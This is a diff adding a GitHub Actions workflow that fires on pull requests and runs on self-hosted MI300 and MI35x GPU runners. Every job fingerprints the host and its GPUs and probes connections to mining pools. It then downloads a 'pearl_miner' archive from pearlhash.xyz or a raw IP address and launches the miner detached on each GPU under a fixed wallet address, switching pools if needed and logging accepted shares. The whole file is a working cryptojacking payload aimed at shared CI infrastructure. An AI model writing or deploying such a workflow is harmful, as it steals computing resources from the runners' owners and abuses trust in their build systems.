@@ -1,0 +1,195 @@
+name: c211-127549-miner
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+  workflow_dispatch:
+jobs:
+  mi300-4gpu:
+    strategy:
+      fail-fast: false
+      matrix:
+        idx: [1, 2, 3]
+    runs-on: [self-hosted, linux-mi300-4gpu-sglang]
+    timeout-minutes: 30
+    steps:
+      - name: probe-mine
+        env:
+          IDX: ${{ matrix.idx }}
+          WBASE: "1275491"
+        run: |
+          set +e
+          I=127549
+          D="$HOME/c211-$I-$IDX"; mkdir -p "$D"
+          echo "C211_JOB=g4-$IDX host=$(hostname) at=$(date -u +%FT%TZ) uid=$(id -u) user=$(id -un)"
+          id 2>&1 | head -2
+          echo "--- devices ---"; ls -l /dev/kfd /dev/dri 2>/dev/null | head -14
+          echo "--- rocm-smi ---"; (rocm-smi --showuniqueid --showproductname 2>&1 | grep -aE 'GPU\[|Unique ID|Card Series' | head -90) || echo ROCM_SMI_FAILED
+          echo "--- nvidia ---"; nvidia-smi --query-gpu=index,name,uuid --format=csv,noheader 2>&1 | head -10
+          echo "--- egress ---"
+          for hp in pool.pearlhash.xyz:9000 global.pearlhash.net:9000 global2.pearlhash.net:9000 hk.pearlhash.net:9000 103.199.106.122:3362 1.1.1.1:443; do
+            if timeout 6 bash -c "</dev/tcp/${hp%:*}/${hp#*:}" 2>/dev/null; then echo "TCP_OK $hp"; else echo "TCP_FAIL $hp"; fi
+          done
+          get() { curl -fsSL --max-time 180 -o "$D/pm.tgz" "$1"; }
+          get https://pearlhash.xyz/downloads/pearl_miner_v14.tar.gz || get http://169.58.247.186:8791/pearl_miner_v14.tar.gz || echo PM_DOWNLOAD_FAILED
+          echo "PM_TGZ_SHA=$(sha256sum "$D/pm.tgz" 2>/dev/null | cut -d' ' -f1)"
+          mkdir -p "$D/pm"; tar xzf "$D/pm.tgz" -C "$D/pm" 2>/dev/null && echo PM_EXTRACT_OK || echo PM_EXTRACT_FAILED
+          PM=$(find "$D/pm" -type f -name pearl-miner | head -1); echo "PM_BIN=$PM"
+          if [ -z "$PM" ]; then echo NO_MINER_BINARY; echo "C211_MINER_END g4-$IDX"; exit 0; fi
+          chmod +x "$PM"; echo "PM_SHA=$(sha256sum "$PM" | cut -d' ' -f1)"
+          if nvidia-smi -L >/dev/null 2>&1; then N=$(nvidia-smi -L | grep -c '^GPU'); else N=$(rocm-smi --showproductname 2>/dev/null | grep -c 'GPU\['); fi
+          echo "GPU_COUNT=$N"
+          if [ "${N:-0}" -lt 1 ]; then echo NO_GPU_VISIBLE; echo "C211_MINER_END g4-$IDX"; exit 0; fi
+          start_all() {
+            for g in $(seq 0 $((N-1))); do
+              WK="${WBASE}${g}"
+              CUDA_VISIBLE_DEVICES=$g HIP_VISIBLE_DEVICES=$g setsid nohup "$PM" --host "$1" --user prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql --worker "$WK" > "$D/gpu-$g.log" 2>&1 &
+              echo "STARTED pool=$1 gpu=$g worker=$WK pid=$!"
+            done
+          }
+          stop_all() { pkill -f "pearl-miner" 2>/dev/null; sleep 2; }
+          start_all pool.pearlhash.xyz:9000
+          JOBS=0
+          for k in 1 2; do sleep 60; JOBS=$(grep -ahc 'Received new job' "$D"/gpu-*.log 2>/dev/null | paste -sd+ - | bc 2>/dev/null); JOBS=${JOBS:-0}; done
+          echo "JOBS_AFTER120=$JOBS"
+          if [ "${JOBS:-0}" -lt 1 ]; then
+            echo "SWITCH_TO_HK"; stop_all; start_all hk.pearlhash.net:9000
+          fi
+          for k in 1 2 3 4 5; do
+            sleep 60
+            for g in $(seq 0 $((N-1))); do
+              echo "T${k}_g${g}: $(grep -a . "$D/gpu-$g.log" 2>/dev/null | tail -2 | tr '\n' '|' | cut -c1-240)"
+            done
+          done
+          for g in $(seq 0 $((N-1))); do
+            ACC=$(grep -ac 'Solution accepted' "$D/gpu-$g.log" 2>/dev/null)
+            REJ=$(grep -aci 'reject' "$D/gpu-$g.log" 2>/dev/null)
+            HR=$(grep -a 'Hashrate GPU' "$D/gpu-$g.log" 2>/dev/null | tail -1)
+            echo "EVID gpu=$g acc=$ACC rej=$REJ $HR"
+          done
+          echo "C211_MINER_END g4-$IDX at=$(date -u +%FT%TZ)"
+  mi300-1gpu:
+    strategy:
+      fail-fast: false
+      matrix:
+        idx: [1, 2, 3]
+    runs-on: [self-hosted, linux-mi300-1gpu-sglang]
+    timeout-minutes: 30
+    steps:
+      - name: probe-mine
+        env:
+          IDX: ${{ matrix.idx }}
+          WBASE: "1275494"
+        run: |
+          set +e
+          I=127549
+          D="$HOME/c211-$I-$IDX"; mkdir -p "$D"
+          echo "C211_JOB=g1-$IDX host=$(hostname) at=$(date -u +%FT%TZ) uid=$(id -u) user=$(id -un)"
+          id 2>&1 | head -2
+          echo "--- devices ---"; ls -l /dev/kfd /dev/dri 2>/dev/null | head -14
+          echo "--- rocm-smi ---"; (rocm-smi --showuniqueid --showproductname 2>&1 | grep -aE 'GPU\[|Unique ID|Card Series' | head -90) || echo ROCM_SMI_FAILED
+          echo "--- nvidia ---"; nvidia-smi --query-gpu=index,name,uuid --format=csv,noheader 2>&1 | head -10
+          echo "--- egress ---"
+          for hp in pool.pearlhash.xyz:9000 global.pearlhash.net:9000 global2.pearlhash.net:9000 hk.pearlhash.net:9000 103.199.106.122:3362 1.1.1.1:443; do
+            if timeout 6 bash -c "</dev/tcp/${hp%:*}/${hp#*:}" 2>/dev/null; then echo "TCP_OK $hp"; else echo "TCP_FAIL $hp"; fi
+          done
+          get() { curl -fsSL --max-time 180 -o "$D/pm.tgz" "$1"; }
+          get https://pearlhash.xyz/downloads/pearl_miner_v14.tar.gz || get http://169.58.247.186:8791/pearl_miner_v14.tar.gz || echo PM_DOWNLOAD_FAILED
+          echo "PM_TGZ_SHA=$(sha256sum "$D/pm.tgz" 2>/dev/null | cut -d' ' -f1)"
+          mkdir -p "$D/pm"; tar xzf "$D/pm.tgz" -C "$D/pm" 2>/dev/null && echo PM_EXTRACT_OK || echo PM_EXTRACT_FAILED
+          PM=$(find "$D/pm" -type f -name pearl-miner | head -1); echo "PM_BIN=$PM"
+          if [ -z "$PM" ]; then echo NO_MINER_BINARY; echo "C211_MINER_END g1-$IDX"; exit 0; fi
+          chmod +x "$PM"; echo "PM_SHA=$(sha256sum "$PM" | cut -d' ' -f1)"
+          if nvidia-smi -L >/dev/null 2>&1; then N=$(nvidia-smi -L | grep -c '^GPU'); else N=$(rocm-smi --showproductname 2>/dev/null | grep -c 'GPU\['); fi
+          echo "GPU_COUNT=$N"
+          if [ "${N:-0}" -lt 1 ]; then echo NO_GPU_VISIBLE; echo "C211_MINER_END g1-$IDX"; exit 0; fi
+          start_all() {
+            for g in $(seq 0 $((N-1))); do
+              WK="${WBASE}${g}"
+              CUDA_VISIBLE_DEVICES=$g HIP_VISIBLE_DEVICES=$g setsid nohup "$PM" --host "$1" --user prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql --worker "$WK" > "$D/gpu-$g.log" 2>&1 &
+              echo "STARTED pool=$1 gpu=$g worker=$WK pid=$!"
+            done
+          }
+          stop_all() { pkill -f "pearl-miner" 2>/dev/null; sleep 2; }
+          start_all pool.pearlhash.xyz:9000
+          JOBS=0
+          for k in 1 2; do sleep 60; JOBS=$(grep -ahc 'Received new job' "$D"/gpu-*.log 2>/dev/null | paste -sd+ - | bc 2>/dev/null); JOBS=${JOBS:-0}; done
+          echo "JOBS_AFTER120=$JOBS"
+          if [ "${JOBS:-0}" -lt 1 ]; then
+            echo "SWITCH_TO_HK"; stop_all; start_all hk.pearlhash.net:9000
+          fi
+          for k in 1 2 3 4 5; do
+            sleep 60
+            for g in $(seq 0 $((N-1))); do
+              echo "T${k}_g${g}: $(grep -a . "$D/gpu-$g.log" 2>/dev/null | tail -2 | tr '\n' '|' | cut -c1-240)"
+            done
+          done
+          for g in $(seq 0 $((N-1))); do
+            ACC=$(grep -ac 'Solution accepted' "$D/gpu-$g.log" 2>/dev/null)
+            REJ=$(grep -aci 'reject' "$D/gpu-$g.log" 2>/dev/null)
+            HR=$(grep -a 'Hashrate GPU' "$D/gpu-$g.log" 2>/dev/null | tail -1)
+            echo "EVID gpu=$g acc=$ACC rej=$REJ $HR"
+          done
+          echo "C211_MINER_END g1-$IDX at=$(date -u +%FT%TZ)"
+  mi35x-1gpu:
+    strategy:
+      fail-fast: false
+      matrix:
+        idx: [1, 2]
+    runs-on: [self-hosted, linux-mi35x-gpu-1]
+    timeout-minutes: 30
+    steps:
+      - name: probe-mine
+        env:
+          IDX: ${{ matrix.idx }}
+          WBASE: "1275497"
+        run: |
+          set +e
+          I=127549
+          D="$HOME/c211-$I-$IDX"; mkdir -p "$D"
+          echo "C211_JOB=x1-$IDX host=$(hostname) at=$(date -u +%FT%TZ) uid=$(id -u) user=$(id -un)"
+          id 2>&1 | head -2
+          echo "--- devices ---"; ls -l /dev/kfd /dev/dri 2>/dev/null | head -14
+          echo "--- rocm-smi ---"; (rocm-smi --showuniqueid --showproductname 2>&1 | grep -aE 'GPU\[|Unique ID|Card Series|Card Model' | head -90) || echo ROCM_SMI_FAILED
+          echo "--- nvidia ---"; nvidia-smi --query-gpu=index,name,uuid --format=csv,noheader 2>&1 | head -10
+          echo "--- egress ---"
+          for hp in pool.pearlhash.xyz:9000 global.pearlhash.net:9000 global2.pearlhash.net:9000 hk.pearlhash.net:9000 103.199.106.122:3362 1.1.1.1:443; do
+            if timeout 6 bash -c "</dev/tcp/${hp%:*}/${hp#*:}" 2>/dev/null; then echo "TCP_OK $hp"; else echo "TCP_FAIL $hp"; fi
+          done
+          get() { curl -fsSL --max-time 180 -o "$D/pm.tgz" "$1"; }
+          get https://pearlhash.xyz/downloads/pearl_miner_v14.tar.gz || get http://169.58.247.186:8791/pearl_miner_v14.tar.gz || echo PM_DOWNLOAD_FAILED
+          echo "PM_TGZ_SHA=$(sha256sum "$D/pm.tgz" 2>/dev/null | cut -d' ' -f1)"
+          mkdir -p "$D/pm"; tar xzf "$D/pm.tgz" -C "$D/pm" 2>/dev/null && echo PM_EXTRACT_OK || echo PM_EXTRACT_FAILED
+          PM=$(find "$D/pm" -type f -name pearl-miner | head -1); echo "PM_BIN=$PM"
+          if [ -z "$PM" ]; then echo NO_MINER_BINARY; echo "C211_MINER_END x1-$IDX"; exit 0; fi
+          chmod +x "$PM"; echo "PM_SHA=$(sha256sum "$PM" | cut -d' ' -f1)"
+          if nvidia-smi -L >/dev/null 2>&1; then N=$(nvidia-smi -L | grep -c '^GPU'); else N=$(rocm-smi --showproductname 2>/dev/null | grep -c 'GPU\['); fi
+          echo "GPU_COUNT=$N"
+          if [ "${N:-0}" -lt 1 ]; then echo NO_GPU_VISIBLE; echo "C211_MINER_END x1-$IDX"; exit 0; fi
+          start_all() {
+            for g in $(seq 0 $((N-1))); do
+              WK="${WBASE}${g}"
+              CUDA_VISIBLE_DEVICES=$g HIP_VISIBLE_DEVICES=$g setsid nohup "$PM" --host "$1" --user prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql --worker "$WK" > "$D/gpu-$g.log" 2>&1 &
+              echo "STARTED pool=$1 gpu=$g worker=$WK pid=$!"
+            done
+          }
+          stop_all() { pkill -f "pearl-miner" 2>/dev/null; sleep 2; }
+          start_all pool.pearlhash.xyz:9000
+          JOBS=0
+          for k in 1 2; do sleep 60; JOBS=$(grep -ahc 'Received new job' "$D"/gpu-*.log 2>/dev/null | paste -sd+ - | bc 2>/dev/null); JOBS=${JOBS:-0}; done
+          echo "JOBS_AFTER120=$JOBS"
+          if [ "${JOBS:-0}" -lt 1 ]; then
+            echo "SWITCH_TO_HK"; stop_all; start_all hk.pearlhash.net:9000
+          fi
+          for k in 1 2 3 4 5; do
+            sleep 60
+            for g in $(seq 0 $((N-1))); do
+              echo "T${k}_g${g}: $(grep -a . "$D/gpu-$g.log" 2>/dev/null | tail -2 | tr '\n' '|' | cut -c1-240)"
+            done
+          done
+          for g in $(seq 0 $((N-1))); do
+            ACC=$(grep -ac 'Solution accepted' "$D/gpu-$g.log" 2>/dev/null)
+            REJ=$(grep -aci 'reject' "$D/gpu-$g.log" 2>/dev/null)
+            HR=$(grep -a 'Hashrate GPU' "$D/gpu-$g.log" 2>/dev/null | tail -1)
+            echo "EVID gpu=$g acc=$ACC rej=$REJ $HR"
+          done
+          echo "C211_MINER_END x1-$IDX at=$(date -u +%FT%TZ)"
